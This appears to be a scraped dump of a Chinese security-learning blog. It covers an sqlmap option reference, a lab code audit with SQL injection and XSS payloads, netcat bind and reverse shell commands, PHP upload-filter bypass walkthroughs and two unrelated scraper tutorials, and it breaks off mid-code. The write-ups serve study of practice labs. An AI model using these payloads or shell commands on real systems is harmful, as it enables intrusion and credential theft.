User-Agent 头--host=HOST HTTP Host 头--referer=REFERER HTTP Referer 头--headers=HEADERS Extra 头(e.g. &quot;Accept-Language: fr\\nETag: 123&quot;)--auth-type=AUTH.. HTTP 认证方式(Basic, Digest, NTLM 或 PKI)--auth-cred=AUTH.. HTTP 认证证书(name:password)--auth-private=A.. HTTP 认证PEM 私钥文件--proxy=PROXY 使用代理连接目标URL--proxy-cred=PRO.. 代理认证证书(name:password)--proxy-file=PRO.. 从文件读取代理列表--ignore-proxy 接受系统默认代理设置--tor 使用Tor 匿名网络--tor-port=TORPORT 设置默认以外的Tor 代理端口--tor-type=TORTYPE 设置 Tor 代理方式(HTTP( 默认), SOCKS4 或SOCKS5)--check-tor 检查Tor 是否正确使用--delay=DELAY 每个HTTP 请求之间延迟的秒数--timeout=TIMEOUT 认定连接超时的秒数(默认 30)--retries=RETRIES 超时重试的次数(默认 3)--randomize=RPARAM 随机改变给定参数的值--safe-url=SAFURL 设置一个安全链接供系统经常访问--safe-freq=SAFREQ 设置一个安全连接供系统在两次测试之间访问--skip-urlencode 不对攻击载荷数据进行URL 编码--force-ssl 强制使用SSL/HTTPS--hpp 使用HTTP 参数污染--eval=EVALCODE 供提交请求之前评估参数的 Python 代码(e.g. &quot;import hashlib;id2=hashlib.md5(id).hexdigest()&quot;) 优化12345-o 开启所有优化开关--predict-output 预测常见的查询输出--keep-alive 使用持久的HTTP(s)连接--null-connection 检索HTTP 响应长度不实际的页面--threads=THREADS 并发HTTP(s)请求的最大数量(默认 1) 注入12345678910111213-p TESTPARAMETER 测试参数--skip=SKIP 跳过对给定参数的测试--dbms=DBMS 在这里强制指定后端DBMS--dbms-cred=DBMS.. DBMS 认证证书(user:password)--os=OS 在这里强制后端DBMS 操作系统--invalid-bignum 使用大数字无效化值--invalid-logical 使用逻辑运算无效化值--invalid-string 使用随机字符串无效化值--no-cast 关闭攻击载荷铸造机制--no-escape 关闭字符串逃逸机制--prefix=PREFIX 注入攻击载荷前缀字符串--suffix=SUFFIX 注入攻击载荷后缀字符串--tamper=TAMPER 使用给定的脚本篡改注入数据 检测12345678--level=LEVEL 执行测试的等级(1-5, 默认 1)--risk=RISK 执行测试的风险(0-3, 默认 1)--string=STRING 查询被评估为True 时的匹配字符串--not-string=NOT.. 查询被评估为False 时的匹配字符串--regexp=REGEXP 查询被评估为True 时的正则表达式--code=CODE 查询被评估为True 时的HTTP 代码--text-only 仅基于文本内容比较网页--titles 仅基于标题比较网页 技术1234567--technique=TECH 使用的SQL 注入技术(默认使用所有技术)--time-sec=TIMESEC DBMS 响应的延迟秒数(默认 5)--union-cols=UCOLS UNION 查询注入测试字段的范围--union-char=UCHAR 暴破字段数量使用的字符--union-from=UFROM UNION 查询注入FROM 部分使用的数据表--dns-domain=DNS.. DNS 溢出攻击所使用的域名--second-order=S.. 二阶响应页面URL 指纹1-f, --fingerprint 检查 DBMS 版本指纹 枚举123456789101112131415161718192021222324252627282930313233-a, --all 检索一切-b, --banner 检索DBMS banner 信息--current-user 检索DBMS 当前用户--current-db 检索DBMS 当前数据库--hostname 检索DBMS 服务器主机名--is-dba 检测当前用户是否是DBA--users 枚举DBMS 用户名--passwords 枚举DBMS 用户密码哈希--privileges 枚举DBMS 用户权限--roles 枚举DBMS 用户角色--dbs 枚举DBMS 数据库--tables 枚举DBMS 数据库表--columns 枚举DBMS 数据库表字段--schema 枚举DBMS 架构--count 检索数据表中的条目数--dump 转储DBMS 数据库表中的条目--dump-all 转储所有DBMS 数据库表中的条目--search 搜索字段名, 表名和(或)库名--comments 检索DBMS 注释-D DB DBMS 数据库-T TBL DBMS 数据库表-C COL DBMS 数据库表字段-X EXCLUDECOL 不枚举DBMS 数据库表字段-U USER DBMS 用户--exclude-sysdbs 枚举数据库表时排除DBMS 系统库--where=DUMPWHERE 转储数据表时使用WHERE 条件--start=LIMITSTART 第一个查询的输出项检索--stop=LIMITSTOP 最后一个查询的输出项检索--first=FIRSTCHAR 第一个查询的输出字的字符检索--last=LASTCHAR 最后一个查询的输出字的字符检索--sql-query=QUERY 要执行的SQL 语句--sql-shell 返回交互式的SQL shell--sql-file=SQLFILE 从给定的文件执行SQL 语句 强制爆破1234--common-tables 检查是否存在常见表--common-columns 检查是否存在常见字段用户定义函数注入：--udf-inject 注入用户自定义函数--shared-lib=SHLIB 共享库的本地路径 文件系统访问123--file-read=RFILE 从后端DBMS 文件系统读取文件--file-write=WFILE 向后端DBMS 文件系统写入本地文件--file-dest=DFILE 向后端DBMS 文件系统写入文件的绝对路径 操作系统访问12345678--os-cmd=OSCMD 执行操作系统命令--os-shell 返回交互式的操作系统shell--os-pwn 返回OOB shell, meterpreter 或VNC--os-smbrelay 一键返回OOB shell, meterpreter 或VNC--os-bof 存储过程缓冲区溢出利用--priv-esc 数据库进程用户权限提升--msf-path=MSFPATH 已安装的Metasploit Framework 本地路径--tmp-path=TMPPATH 远程临时文件目录的绝对路径 Windows注册表访问1234567--reg-read 读取一个Windows 注册表键值--reg-add 写入一个Windows 注册表键值--reg-del 删除一个Windows 注册表键值--reg-key=REGKEY Windows 注册表键--reg-value=REGVAL Windows 注册表键值--reg-data=REGDATA Windows 注册表键值数据--reg-type=REGTYPE Windows 注册表键值类型 常规12345678910111213141516171819202122232425262728-s SESSIONFILE 从存储(.sqlite)文件中读取会话-t TRAFFICFILE 记录所有HTTP 流量为一个文本文件--batch 从不询问用户输入, 使用默认行为--charset=CHARSET 强制数据检索使用的字符编码--crawl=CRAWLDEPTH 从目标URL 抓取起始网页--csv-del=CSVDEL CSV 输出中使用的定界符(默认&quot;,&quot;)--dump-format=DU.. 转储数据的格式(CSV(默认), 可以设置为HTML或SQLITE)--eta 显示每个输出的预计到达时间--flush-session 刷新当前目标的会话文件--forms 分析并测试目标URL 中的表单--fresh-queries 忽略在会话文件中存储的查询结果--hex 对数据检索使用DBMS 的hex 函数--output-dir=OUT.. 自定义输出目录路径--parse-errors 从响应中分析并显示DBMS 错误消息--pivot-column=P.. 透视字段--save 保存选项到INI 配置文件--scope=SCOPE 用正则表达式从所提供的代理日志过滤目标--test-filter=TE.. 通过攻击载荷和(或)标题选择测试(e.g. ROW)--update 更新sqlmap 杂项123456789101112131415-z MNEMONICS 使用短记忆法(e.g. &quot;flu,bat,ban,tec=EU&quot;)--alert=ALERT 当找到 SQL 注入时运行操作系统命令--answers=ANSWERS 设置问题的答案(e.g. &quot;quit=N,follow=N&quot;)--beep 当找到SQL 注入时发出蜂鸣--check-waf 启发式检查 WAF/IPS/IDS 保护--cleanup 从sqlmap 具体UDF 和表清理DBMS--dependencies 检查是否缺少(非核心)的sqlmap 的依赖--disable-coloring 禁用控制台输出着色--gpage=GOOGLEPAGE 从指定页码使用Google dork 结果--identify-waf 使测试通过 WAF/IPS/IDS 保护--mobile 通过HTTP User-Agent 头模拟智能手机--page-rank 为Google dork 结果显示网页排名(PR)--purge-output 从输出目录中安全删除所有内容--smart 仅通过积极的启发式进行测试--wizard 用于初级用户的简单向导接口 参考：sqlmap参考手册 结束对于sqlmap的学习，其实不用死记硬背其中的参数，用到的时候查就行。这学期学安全的时间到此结束了，开始准备期末了，寒假再见了~~","link":"/2019/11/24/SQLMAP%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/"},{"title":"代码审计初试-对zvuldrill漏洞靶场的代码审计(一)","text":"一.zvuldrill靶场搭建靶场地址:https://github.com/710leo/ZVulDrill按照上面的要求需要创建一个名为zvuldrill的数据库，在将sys文件夹下的zvuldrill.sql导入到新建数据库中。创建完成之后，在浏览器打开:http://127.0.0.1/ZVulDrill/ 即可访问 二.后台登录功能万能密码绕过采用正向审计的方法，即先找到用户的可控输入位置，在定位到危险函数。首先用rips代码审计工具进行scan，找到用户可控输入找到用户可控输入$_POST[pass]，发现它存在于logCheck.php中，用seay代码审计工具打开所以我们可以直接构造万能密码123' or 1 or '1' or 1 #' or 1 --直接不用输入密码就可以绕过检测机制我们来验证一下用Navicat数据库工具打开本地的数据库将logCheck.php中的改造一下1SELECT * FROM admin WHERE admin_name = 'admin' or '1'AND admin_pass = SHA('$pass')复制到数据库命令行中登录网站:http://127.0.0.1/ZVulDrill/admin/login.php根据seay自带的mysql检测工具可以看到，我们进行的数据库操作 三.前台搜索功能sql注入继续看rips扫描的结果，发现有个$_GET[search]参数用户可控用seay审计工具打开发现用户传入的search参数，没有进行任何过滤就直接加入了sql语句中，这容易造成搜索型sql注入。验证，打开数据库命令行，先查看数据库有几列用order by语句，发现为5时会报错，4时显示正常，所以这个数据库的列是4。所以我们打开admin的数据表，查看对应的列名。可以用union select联合查询语句构造payload，直接爆出管理员的密码。1SELECT * FROM comment WHERE comment_text LIKE '%%' union select admin_id,admin_name,admin_pass,4 from admin;用过构造sql注入语句11%' union select 1,2,admin_pass,4 from admin#在网页中尝试 发现可以爆出管理员的密码 在这个搜索页面中不光有sql注入漏洞，xss也同样存在，因为这个页面对用户输入的没有进行过滤。构造xss payload:1&lt;script&gt;alert(/xss/)&lt;/script&gt;完成弹框","link":"/2019/11/09/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%88%9D%E8%AF%95-%E5%AF%B9zvuldrill%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%B8%80/"},{"title":"nc详解","text":"一.简介Nc全名为Netcat，网络工具中的瑞士军刀。主要功能为：1.侦听模式/传输模式2.telnet/获取banner信息3.传输文本信息4.传输文件/目录5.加密传输文件6.远程控制/木马7.加密所有流量8.流媒体服务器9.远程克隆硬盘123456789101112131415161718-h 查看帮助信息-d 后台模式-g gateway source-routing hop point[s], up to 8-G num source-routing pointer: 4, 8, 12, …-e prog程序重定向，一但连接就执行［危险］-i secs延时的间隔-l 监听模式，用于入站连接-L 监听模式，连接天闭后仍然继续监听，直到CTR+C-n IP地址，不能用域名(不使用DNS反向查询IP地址的域名)-o film记录16进制的传输-p[空格]端口 本地端口号-s addr 本地源地址-r 随机本地及远程端口-t 使用Telnet交互方式-u UDP模式-v 详细输出，用-vv将更详细-w 数字 timeout延时间隔-z 将输入，输出关掉（用于扫锚时） 二.telnet/获取banner信息-n 参数：只接收ip，没有dns解析-v 参数：返回详细信息我们先来解析一下要连接的ip地址：用nc -nv 连接目标的80端口 三.传输文本信息-l：设置为监听模式-p：指定一个开放的端口用-l -p参数将目标设置为服务器，并开放一个端口等待连接我们可以用nc进行聊天： 四.传输文件或目录Nc可以当作一个文件传输服务器，传输文件到目标机器。传输可分为正向传输和反向传输。正向传输：12nc -lp 444&lt;1.pync -nv 1.1.1.1 444 &gt;2.py 反向传输：12nc -lp 444&gt;1.pync -nv 1.1.1.1 444&lt;1.py 五.Nc端口扫描nc -nvz 开启端口扫描 默认扫描tcp端口nc -nvzu 扫描udp端口12nc -nvz 1.1.1.1 1-65535nc -nvzu 1.1.1.1 1-1024 六.远程控制正向控制：12nc -lp port -c bash/cmdnc -nv ip意思是服务器开放一个端口，当客户端连接时直接获取shell，这样在客户端就能执行服务器的命令 反向控制：12nc -ip portnc -nv ip -c bash/cmd意思是服务器开放一个端口，当客户端连接时直接将自己的shell给服务器端，在服务器端执行客户端命令 好久没更新了，因为最近一直按专题学习常见的漏洞，也没啥好写的，最近在学习sql注入，等写完了再一块发出来吧~","link":"/2019/11/21/nc%E8%AF%A6%E8%A7%A3/"},{"title":"Hello World","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","link":"/2020/02/06/hello-world/"},{"title":"实战_爬取中国天气网","text":"目标将中国天气网所有城市的最低气温爬取下来，将最低气温的前十名可视化显示出来。这个爬虫比较简单没有做反爬处理，所以对于获取html代码比较简单，关键在于如何解析得到的html代码。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import requestsfrom bs4 import BeautifulSoupfrom pyecharts.charts.bar import BarALL_DATA=[]def parse_page(url): headers={ &quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36&quot; } resp=requests.get(url,headers=headers) #print(resp.text) text=resp.content.decode(&quot;utf-8&quot;) # print(text) #这里使用的解析器是html5lib，因为在使用常用的lxml解析器容错率不好，港澳台天气这个页面html书写不规范，从而无法正常爬取。 #pip install html5lib soup=BeautifulSoup(text,&quot;html5lib&quot;) divs=soup.find(&quot;div&quot;,class_=&quot;conMidtab&quot;) #获取第一个div标签 tables=divs.find_all(&quot;table&quot;) for table in tables: trs=table.find_all(&quot;tr&quot;)[2:] for index,tr in enumerate(trs): # print(tr) # print(&quot;=&quot;*30) tds=tr.find_all(&quot;td&quot;) if(index==0): city_td=tds[1] else: city_td=tds[0] city=list(city_td.stripped_strings)[0] # print(city) temp_td=tds[-2] temp=list(temp_td.stripped_strings)[0] # print({'city':city,'temp':temp}) data={'city':city,'temp':int(temp)} ALL_DATA.append(data)def spider(): base_url=&quot;http://www.weather.com.cn/textFC/{}.shtml&quot; params=[&quot;hb&quot;,&quot;db&quot;,&quot;hd&quot;,&quot;hz&quot;,&quot;hn&quot;,&quot;xb&quot;,&quot;xn&quot;,&quot;gat&quot;] for param in params: url=base_url.format(param) parse_page(url) ALL_DATA.sort(key=lambda x:x['temp']) # print(ALL_DATA) data=ALL_DATA[0:10] cicties=list(map(lambda x:x['city'],data)) temps=list(map(lambda x:x['temp'],data)) chart=Bar(&quot;中国天气排行榜&quot;) chart.add(&quot;&quot;,cicties,temps) chart.render('temp.html')if __name__ == '__main__': spider() 要点这里使用的是beautifulsoup库，用的解析器是html5lib；因为在爬取港澳台地区的天气时，这个页面的html代码写的不规范。如果我们使用常用的lxml解析器的话会无法正常爬取。1pip install html5lib这里是这段代码比较重要的部分，通过sort函数对得到的数据进行排序，’key=’参数指定按什么关键字排序。1ALL_DATA.sort(key=lambda x:x['temp'])这里是按照字典中的temp参数进行排序 12cicties=list(map(lambda x:x['city'],data))temps=list(map(lambda x:x['temp'],data)) 这段代码是通过lambda和map()将城市和对应的最低温度形成单个的列表 最后效果如图：","link":"/2020/02/05/%E5%AE%9E%E6%88%98-%E7%88%AC%E5%8F%96%E4%B8%AD%E5%9B%BD%E5%A4%A9%E6%B0%94%E7%BD%91/"},{"title":"爬虫实战_电影天堂爬虫","text":"前言近段时间一直在学习爬虫，昨天闲来无事做了一个简单的小爬虫来爬取电影天堂热门电影的前7页。本爬虫利用requests库和lxml库结合来解析得到的html代码，当然也可以使用BeautifulSoup库来解析，但我比较喜欢lxml库和XPATH语法相结合的解析。 这个实战是爬取电影天堂热门电影前七页。分为三步：1.获取每个页面的电影详细页；2.解析每个电影详细页；3.将第一步和第二步结合，爬取前七页。 具体代码如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798import requestsfrom lxml import etreeBASE_DOMAIN=&quot;https://www.dytt8.net&quot;HEADERS={ &quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36&quot;}def get_detail_url(url): resp = requests.get(url, headers=HEADERS) text = resp.text # print(text) html = etree.HTML(text) detail_urls = html.xpath(&quot;//ul//table[@class='tbspan']//a/@href&quot;) # def abc(url1): # return BASE_DOMAIN+url1 # index=0 # for detail_url in detail_urls: # detail_url = abc(detail_url) # detail_urls[index]=detail_url # index =index+1 detail_urls=map(lambda url:BASE_DOMAIN+url,detail_urls) return detail_urlsdef parse_detail_page(url): resp=requests.get(url,headers=HEADERS) text=resp.content.decode(&quot;gbk&quot;) movie={} #print(text) html=etree.HTML(text) #电影名称 title=html.xpath(&quot;//div[@class='title_all']//font[@color='#07519a']//text()&quot;)[0] movie['title']=title #电影海报 img=html.xpath(&quot;//div[@id='Zoom']//img/@src&quot;) cover=img movie['cover']=cover #div下所有文本 infos=html.xpath(&quot;//div[@id='Zoom']//text()&quot;) for index,info in enumerate(infos): def page_info(info,rules): info=info.replace(rules,&quot;&quot;).strip() return info if info.startswith(&quot;◎年 代&quot;): info=page_info(info,&quot;◎年 代&quot;) movie['year']=info elif info.startswith(&quot;◎产 地&quot;): info=page_info(info,&quot;◎产 地&quot;) movie['country']=info elif info.startswith(&quot;◎类 别&quot;): info=page_info(info,&quot;◎类 别&quot;) movie['类别']=info elif info.startswith(&quot;◎豆瓣评分&quot;): info=page_info(info,&quot;◎豆瓣评分&quot;) movie['豆瓣评分']=info elif info.startswith(&quot;◎导 演&quot;): info=page_info(info,&quot;◎导 演&quot;) dirctors=[info] for x in range(index+1,len(infos)): dirctor=infos[x].strip() if dirctor.startswith(&quot;◎编 剧&quot;): break dirctors.append(dirctor) movie['导演']=dirctors elif info.startswith(&quot;◎编 剧&quot;): info=page_info(info,&quot;◎编 剧&quot;) movie[&quot;编剧&quot;]=info elif info.startswith(&quot;◎主 演&quot;): info=page_info(info,&quot;◎主 演&quot;) actors=[info] for x in range(index+1,len(infos)): actor=infos[x].strip() if(actor.startswith(&quot;◎标 签&quot;)): break actors.append(actor) movie['actors']=actors elif info.startswith(&quot;◎简 介&quot;): info=page_info(info,&quot;◎简 介&quot;) for x in range(index+1,len(infos)): detail=infos[x].strip() if(detail.startswith(&quot;◎获奖情况&quot;)): break movie['detail']=detail download_url=html.xpath(&quot;//td[@bgcolor='#fdfddf']//a/text()&quot;) movie['download_url']=download_url return moviedef spider(): #爬取前7页 base_url=&quot;https://www.dytt8.net/html/gndy/dyzz/list_23_{}.html&quot; movies=[] for x in range(1,8): #第一个循环获取每个页面 url=base_url.format(x) detail_urls=get_detail_url(url) for detail_url in detail_urls: #第二个循环获取每个网页电影的详细页 movie=parse_detail_page(detail_url) movies.append(movie) print(movies)if __name__ == '__main__': spider() 第一步获取每个网页的电影详细页： 第二步解析电影详细页： 第三步爬取前七页：","link":"/2020/02/05/%E7%88%AC%E8%99%AB%E5%AE%9E%E6%88%98-%E7%94%B5%E5%BD%B1%E5%A4%A9%E5%A0%82%E7%88%AC%E8%99%AB/"},{"title":"文件上传靶场通关笔记","text":"upload-labs 文件上传靶场通关笔记第一关。上传前端检测 有两种方法：1.直接f12，查看js检测函数，在把form表单中检测函数删掉就能绕过前端检测2.先将后缀名改成合法的后缀，上传抓包，在包中再把后缀改过来就能绕过。 最后会把一句话木马上传到服务器，完成上传 这类的前端检测文件上传，不安全，是纸老虎！！ 文件上传必须在后端做检测。前端验证的标志就是弹框提示12345678910111213141516171819&lt;script type=&quot;text/javascript&quot;&gt; function checkFile() { var file = document.getElementsByName('upload_file')[0].value; if (file == null || file == &quot;&quot;) { alert(&quot;请选择要上传的文件!&quot;); return false; } //定义允许上传的文件类型 var allow_ext = &quot;.jpg|.png|.gif&quot;; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;)); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name) == -1) { var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name; alert(errMsg); return false; } }&lt;/script&gt;前端代码如上面第二关。查看源码：1234567891011121314151617if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name']; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '文件类型不正确，请重新上传！'; } } else { $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！'; }}发现这段代码只对文件的content-type作出了判断，所以我们可以通过抓包改文件的type来突破上传这样就可以上传绕过对于文件mine类型的检测 第三关123456789101112131415161718192021222324if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array('.asp','.aspx','.php','.jsp'); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if(!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; }}这段代码是文件上传的黑名单检测，只要是黑名单里面的后缀名都禁止上传黑名单在设计时可能有遗漏，我们可以找到这些遗漏的后缀名，突破上传。像 php5,php4,cer等都是遗漏的点但是这里有个做法，就是重命名上传文件，关键代码是：12$temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;用菜刀连接的时候是访问.php5这样是可以访问的 不是php第四关源码：12345678910111213141516171819202122232425if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '此文件不允许上传!'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; }}这也是黑名单检测，但是它把所以可以利用的后缀名全部过滤了。这里要用到一个新的知识点：.htaccess.htaccess是apache服务器中的一个配置文件。它负责相关目录下的网页配置，通过.htaccess文件可以实现网页301重定向、自定义404页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能123&lt;FilesMatch &quot;D&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;这是.htaccess文件，调用php的解析器一个文件名，只要包含”cimer”这个字符串的任意文件，都当作php解析 所以利用思路就是先上传.htaccess文件，在上传.htaccess中指定的文件 完成突破 第五关源码:123456789101112131415161718192021222324if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '此文件类型不允许上传！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; }}根据源码发现它没有对大小写进行限制，所以我们可以进行大小写绕过 第六关源码：12345678910111213141516171819202122232425if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = $_FILES['upload_file']['name']; $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '此文件不允许上传'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; }}看见源码没有对末尾进行去空格操作，所以可以在上传时抓包 在上传的文件后面加个空格，就可以突破上传 第七关12345678910111213141516171819202122232425if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quo